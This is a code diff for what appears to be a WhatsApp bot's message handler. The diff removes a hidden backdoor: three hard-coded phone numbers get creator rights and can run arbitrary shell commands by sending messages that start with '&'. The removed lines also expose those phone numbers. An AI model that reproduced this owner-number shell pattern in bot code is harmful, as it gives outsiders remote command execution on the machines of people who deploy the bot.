@@ -257,7 +257,7 @@ conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));
             await Promise.all([
               saveMessage(mek),
             ]);
-const m = sms(conn, mek)
+  const m = sms(conn, mek)
   const type = getContentType(mek.message)
   const content = JSON.stringify(mek.message)
   const from = mek.key.remoteJid
@@ -275,6 +275,7 @@ const m = sms(conn, mek)
   const botNumber = conn.user.id.split(':')[0]
   const pushname = mek.pushName || 'Sin Nombre'
   const isMe = botNumber.includes(senderNumber)
+  const isOwner = ownerNumber.includes(senderNumber) || isMe
   const botNumber2 = await jidNormalizedUser(conn.user.id);
   const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
   const groupName = isGroup ? groupMetadata.subject : ''
@@ -286,47 +287,13 @@ const m = sms(conn, mek)
   const reply = (teks) => {
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
-const udp = botNumber.split('@')[0];
-const jawadop = ['923470027813', '923191089077', '923427582273']; // Fixed: this should be an array
+  
+const botOwner = conn.user.id.split(":")[0] + "@s.whatsapp.net";
+const ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));
 
-const ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));  
-
-let isCreator = [udp, ...jawadop, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
-.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
-.includes(mek.sender);
-
-// You can use isCreator as isOwner
-let isOwner = isCreator;
-
-if (isCreator && mek.text.startsWith("&")) {
-    let code = budy.slice(2);
-    if (!code) {
-        reply(`Provide me with a query to run Master!`);
-        return;
-    }
-    const { spawn } = require("child_process");
-    try {
-        let resultTest = spawn(code, { shell: true });
-        resultTest.stdout.on("data", data => {
-            reply(data.toString());
-        });
-        resultTest.stderr.on("data", data => {
-            reply(data.toString());
-        });
-        resultTest.on("error", data => {
-            reply(data.toString());
-        });
-        resultTest.on("close", code => {
-            if (code !== 0) {
-                reply(`command exited with code ${code}`);
-            }
-        });
-    } catch (err) {
-        reply(util.format(err));
-    }
-    return;
-}
-
+const isCreator = [botOwner, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
+    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
+    .includes(mek.sender);
 // ... fixed isCreater ✅ ...
 	  
   //==========public react============//
